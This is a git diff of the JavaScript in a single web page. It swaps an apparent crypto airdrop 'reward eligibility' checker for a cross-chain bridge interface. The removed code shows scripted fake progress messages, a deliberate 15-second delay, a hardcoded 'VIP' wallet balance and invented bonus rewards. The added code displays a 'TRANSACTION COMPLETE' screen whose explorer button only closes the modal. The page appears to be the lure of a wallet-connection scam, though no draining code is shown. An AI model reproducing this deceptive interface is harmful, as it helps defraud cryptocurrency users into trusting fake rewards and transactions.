+                        <span>TRANSACTION COMPLETE</span>
+                    </div>
+                </div>
+                <div class="tx-hash">
+                    TXN HASH:<br>${txHash.substring(0, 32)}...<br>${txHash.substring(32)}
+                </div>
+                <button class="btn-view-tx" onclick="closeLoadingModal()">VIEW ON EXPLORER</button>
+            `;
+            
+            walletConnected = true;
+        }
+
+        function closeLoadingModal() {
+            const modal = document.getElementById('loadingModal');
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            
+            // Reset form
+            document.getElementById('amountInput').value = '';
+            document.getElementById('usdValue').textContent = '≈ $0.00 USD';
+            document.getElementById('routes').style.display = 'none';
+        }
+
+        function swapChains() {
+            // Swap the selected chains
+            const temp = selectedFromChain;
+            selectedFromChain = selectedToChain;
+            selectedToChain = temp;
+            
+            // Update display
+            const fromChain = chains[selectedFromChain];
+            const toChain = chains[selectedToChain];
+            
+            updateChainDisplay('from', fromChain);
+            updateChainDisplay('to', toChain);
+            
+            // Clear routes if shown
+            document.getElementById('routes').style.display = 'none';
+        }
+
+        let currentChainSelection = null;
+
+        function selectChain(type) {
+            currentChainSelection = type;
+            
+            // Update modal title
+            document.getElementById('chainModalTitle').textContent = 
+                type === 'from' ? 'SELECT FROM CHAIN' : 'SELECT TO CHAIN';
+            
+            // Populate chain list
+            const chainList = document.getElementById('chainList');
+            chainList.innerHTML = '';
+            
+            Object.keys(chains).forEach(key => {
+                const chain = chains[key];
+                const option = document.createElement('div');
+                option.className = 'chain-option';
+                option.onclick = () => selectChainOption(key);
+                
+                option.innerHTML = `
+                    <img src="${chain.logo}" alt="${chain.symbol}" class="chain-option-icon">
+                    <div class="chain-option-info">
+                        <h4>${chain.name.toUpperCase()}</h4>
+                        <p>${chain.symbol}</p>
+                    </div>
+                `;
+                
+                chainList.appendChild(option);
             });
             
-            clearTimeout(timeout);
+            // Show modal
+            document.getElementById('chainModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function selectChainOption(key) {
+            const chain = chains[key];
             
-            const data = await res.json();
-            
-            if (data.result) {
-                return { balance: data.result };
+            if (currentChainSelection === 'from') {
+                selectedFromChain = key;
+                updateChainDisplay('from', chain);
+            } else {
+                selectedToChain = key;
+                updateChainDisplay('to', chain);
             }
             
-            if (data.error) {
-                errors.push(data.error.message);
+            closeChainModal();
+        }
+
+        function closeChainModal() {
+            document.getElementById('chainModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        function closeChainModalOutside(event) {
+            if (event.target === document.getElementById('chainModal')) {
+                closeChainModal();
             }
-        } catch (err) {
-            errors.push(err.message);
         }
-    }
-    
-    throw new Error(translations[currentLang].connectionError);
-}
 
-// History management
-function addToHistory(address) {
-    let history = JSON.parse(localStorage.getItem('walletHistory') || '[]');
-    
-    history = history.filter(item => item.address.toLowerCase() !== address.toLowerCase());
-    
-    history.unshift({
-        address: address,
-        timestamp: Date.now()
-    });
-    
-    if (history.length > MAX_HISTORY_ITEMS) {
-        history = history.slice(0, MAX_HISTORY_ITEMS);
-    }
-    
-    localStorage.setItem('walletHistory', JSON.stringify(history));
-    updateHistoryDisplay();
-}
-
-function updateHistoryDisplay() {
-    const history = JSON.parse(localStorage.getItem('walletHistory') || '[]');
-    const historySection = document.getElementById('historySection');
-    const historyList = document.getElementById('historyList');
-    
-    if (history.length === 0) {
-        historySection.style.display = 'none';
-        return;
-    }
-    
-    historySection.style.display = 'block';
-    historyList.innerHTML = '';
-    
-    history.forEach(item => {
-        const div = document.createElement('div');
-        div.className = 'history-item';
-        div.onclick = () => {
-            document.getElementById('walletAddress').value = item.address;
-            showToast('Address loaded from history', 'success');
-        };
-        
-        const timeAgo = formatTimeAgo(item.timestamp);
-        
-        div.innerHTML = `
-            <div class="history-address">${item.address.slice(0, 6)}...${item.address.slice(-4)}</div>
-            <div class="history-time">${timeAgo}</div>
-        `;
-        
-        historyList.appendChild(div);
-    });
-}
-
-function clearHistory() {
-    if (confirm('Clear all search history?')) {
-        localStorage.removeItem('walletHistory');
-        updateHistoryDisplay();
-        showToast('History cleared', 'success');
-    }
-}
-
-function formatTimeAgo(timestamp) {
-    const seconds = Math.floor((Date.now() - timestamp) / 1000);
-    
-    if (seconds < 60) return 'Just now';
-    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
-    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
-    return `${Math.floor(seconds / 86400)}d ago`;
-}
-
-// Paste from clipboard
-async function pasteFromClipboard() {
-    const input = document.getElementById('walletAddress');
-    
-    try {
-        const text = await navigator.clipboard.readText();
-        input.value = text.trim();
-        showToast('Address pasted from clipboard!', 'success');
-    } catch (err) {
-        // Fallback - focus on input for manual paste
-        input.focus();
-        showToast('Please paste manually (Ctrl+V)', 'info');
-    }
-}
-
-// Result display
-function showResult(balance, error, address) {
-    const t = translations[currentLang];
-    const resultDiv = document.getElementById('result');
-    
-    if (error) {
-        resultDiv.innerHTML = `
-            <div class="result error">
-                <div class="result-title">⚠️ ${t.errorTitle}</div>
-                <p>${error}</p>
-            </div>
-        `;
-        return;
-    }
-
-    const ethBalance = parseInt(balance, 16) / 1e18;
-    const isVip = address.toLowerCase() === VIP_WALLET;
-    
-    let displayBalanceUsd;
-    if (isVip) {
-        displayBalanceUsd = VIP_BALANCE_USD;
-    } else {
-        displayBalanceUsd = ethBalance * currentEthPrice;
-    }
-    
-    const bonusUsd = displayBalanceUsd * BONUS_PERCENTAGE / 100;
-    const bonusEth = (bonusUsd / currentEthPrice).toFixed(4);
-
-    if (isVip || displayBalanceUsd >= MIN_BALANCE_USD) {
-        const vipMessage = isVip ? `<div class="vip-message">✅ ${t.vipMessage}</div>` : '';
-        
-        resultDiv.innerHTML = `
-            <div class="result success">
-                <div class="result-title">🎉 ${t.successTitle}</div>
-                <p>${t.successContent}</p>
-                ${vipMessage}
-                <div class="stat-box" style="margin-top:20px;">
-                    <div class="stat-label">${t.currentBalance}</div>
-                    <div class="stat-value">≈ $${parseFloat(displayBalanceUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
-                </div>
-                <div class="reward-box">
-                    <div style="font-size:12px; color:#059669; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:6px;">${t.yourReward}</div>
-                    <div style="font-size:32px; font-weight:900; color:#059669; line-height:1;">${bonusEth} ETH</div>
-                    <div style="font-size:14px; color:#059669; font-weight:600; margin-top:4px;">≈ $${parseFloat(bonusUsd).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
-                </div>
-            </div>
-        `;
-        
-        showToast(t.successTitle, 'success');
-    } else {
-        resultDiv.innerHTML = `
-            <div class="result error">
-                <div class="result-title">❌ ${t.failTitle}</div>
-                <p>${t.failContent}</p>
-                <div class="stat-box" style="margin-top:16px;">
-                    <div class="stat-label">${t.currentBalance}</div>
-                    <div class="stat-value">${ethBalance.toFixed(4)} ETH</div>
-                    <div class="stat-label" style="margin-top:8px;">≈ $${displayBalanceUsd.toFixed(2)}</div>
-                </div>
-            </div>
-        `;
-    }
-    
-    addToHistory(address);
-}
-
-// Modal management
-function openTermsModal() {
-    document.getElementById('termsModal').classList.add('active');
-    document.body.style.overflow = 'hidden';
-}
-
-function closeTermsModal() {
-    document.getElementById('termsModal').classList.remove('active');
-    document.body.style.overflow = '';
-}
-
-// Form submission
-document.getElementById('walletForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-    
-    const address = document.getElementById('walletAddress').value.trim();
-    const t = translations[currentLang];
-    const btn = document.getElementById('checkButton');
-    const btnText = document.getElementById('buttonText');
-    
-    // Validate address format
-    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
-        showResult(null, t.invalidAddress, address);
-        showToast(t.invalidAddress, 'error');
-        return;
-    }
-
-    // Update button state
-    btn.disabled = true;
-    
-    // Array of checking messages
-    const checkingMessages = [
-        'Checking wallet activity...',
-        'Analyzing transaction history...',
-        'Calculating potential rewards...',
-        'Verifying network participation...',
-        'Processing eligibility criteria...'
-    ];
-    
-    let messageIndex = 0;
-    
-    // Show first message
-    btnText.innerHTML = `<div class="btn-loading"><div class="spinner"></div><span>${checkingMessages[messageIndex]}</span></div>`;
-    
-    // Change message every 3 seconds
-    const messageInterval = setInterval(() => {
-        messageIndex = (messageIndex + 1) % checkingMessages.length;
-        btnText.innerHTML = `<div class="btn-loading"><div class="spinner"></div><span>${checkingMessages[messageIndex]}</span></div>`;
-    }, 3000);
-
-    try {
-        // Fetch current ETH price
-        await getEthPrice();
-        
-        // Check wallet balance
-        const result = await checkWallet(address);
-        
-        // Add 15 second delay
-        await new Promise(resolve => setTimeout(resolve, 15000));
-        
-        // Clear message interval
-        clearInterval(messageInterval);
-        
-        // Show results
-        showResult(result.balance, null, address);
-    } catch (err) {
-        // Clear message interval on error
-        clearInterval(messageInterval);
-        showResult(null, err.message, address);
-        showToast(err.message, 'error');
-    } finally {
-        btn.disabled = false;
-        btnText.textContent = t.buttonText;
-    }
-});
-
-// Event listeners
-document.getElementById('acceptBtn').addEventListener('click', acceptCookies);
-document.getElementById('declineBtn').addEventListener('click', declineCookies);
-document.getElementById('themeToggle').addEventListener('click', toggleTheme);
-document.getElementById('languageSelect').addEventListener('change', (e) => changeLanguage(e.target.value));
-document.getElementById('pasteBtn').addEventListener('click', pasteFromClipboard);
-document.getElementById('closeModal').addEventListener('click', closeTermsModal);
-document.getElementById('termsLink').addEventListener('click', openTermsModal);
-document.getElementById('clearHistory').addEventListener('click', clearHistory);
-
-// Modal click outside to close
-document.getElementById('termsModal').addEventListener('click', function(e) {
-    if (e.target.id === 'termsModal') closeTermsModal();
-});
-
-// Keyboard shortcuts
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') closeTermsModal();
-    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
-        e.preventDefault();
-        document.getElementById('walletAddress').focus();
-    }
-});
-
-// Initialize on load
-window.addEventListener('load', function() {
-    initTheme();
-    initLanguage();
-    initCookieBanner();
-    updateHistoryDisplay();
-    
-    // Make button globally accessible
-    window.CONNECT_WALLET_BUTTON = document.getElementById('connectWalletBtn');
-    console.log('✅ Connect Wallet Button initialized:', window.CONNECT_WALLET_BUTTON);
-    
-    // Load cached ETH price
-    const cached = localStorage.getItem('cachedEthPrice');
-    if (cached) {
-        const { price, timestamp } = JSON.parse(cached);
-        if (Date.now() - timestamp < PRICE_CACHE_DURATION) {
-            currentEthPrice = price;
-            lastPriceFetch = timestamp;
+        function updateChainDisplay(type, chain) {
+            const selector = type === 'from' ? 
+                document.querySelector('#fromChainSelector') : 
+                document.querySelector('#toChainSelector');
+            
+            if (selector) {
+                const img = selector.querySelector('.chain-icon');
+                const h4 = selector.querySelector('h4');
+                const p = selector.querySelector('p');
+                
+                img.src = chain.logo;
+                img.alt = chain.symbol;
+                h4.textContent = chain.name.toUpperCase();
+                
+                if (type === 'from') {
+                    p.textContent = 'SELECT NETWORK';
+                } else {
+                    p.textContent = "YOU'LL RECEIVE";
+                }
+            }
         }
-    }
-});
+
+        function openModal() {
+            document.getElementById('modal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        function closeModalOutside(event) {
+            if (event.target === document.getElementById('modal')) {
+                closeModal();
+            }
+        }
+
+        // Close modal on Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                closeModal();
+                closeChainModal();
+            }
+        });
+
+        // Initialize: Fetch prices on page load
+        fetchCryptoPrices();
+        
+        // Refresh prices every 30 seconds
+        setInterval(fetchCryptoPrices, 30000);
     </script>
 </body>
 </html>
